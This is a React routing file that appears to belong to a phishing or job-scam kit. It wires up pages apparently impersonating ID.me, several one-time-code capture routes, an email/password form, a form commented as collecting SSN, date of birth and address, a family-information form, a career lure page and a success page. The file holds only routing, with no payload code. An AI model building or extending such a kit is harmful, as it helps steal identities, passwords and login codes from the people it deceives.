// src/App.tsx

import React from "react";
import { Routes, Route } from "react-router-dom";

// Page Imports
import Home from "./pages/Home";
import Career from "./pages/Career";  // Add Career page import
import Ime from "./pages/ime";
import Idme from "./pages/idme";
import IdmeOtp from "./pages/idmeotp";
import Otp from "./pages/otp";
import Otp2 from "./pages/idmeotp2";

// Form Components
import SignInForm from "./pages/form";      // Main form with email/password
 // Form with Full Name, Mobile, SSN, DOB, Address
import Teil from "./pages/teil";                 // Family information form
import SuccessPage from "./pages/SuccessPages";   // Success page with animation

const App: React.FC = () => {
  return (
    <Routes>
      {/* Main Routes */}
      <Route path="/" element={<Home />} />
      <Route path="/career" element={<Career />} />  {/* Career page route */}
      <Route path="/ime" element={<Ime />} />
      
      {/* ID.me Routes */}
      <Route path="/idme" element={<Idme />} />
      <Route path="/idmeotp" element={<IdmeOtp />} />
      <Route path="/otp" element={<Otp />} />
      <Route path="/idmeotp2" element={<Otp2 />} />
      
      {/* Form Routes */}
      <Route path="/form" element={<SignInForm />} />           {/* Email & Password form */}
        {/* Full validation form with 5 fields */}
      <Route path="/teil" element={<Teil />} />                   {/* Family information form */}
      <Route path="/success" element={<SuccessPage />} />         {/* Success page */}
    </Routes>
  );
};

export default App;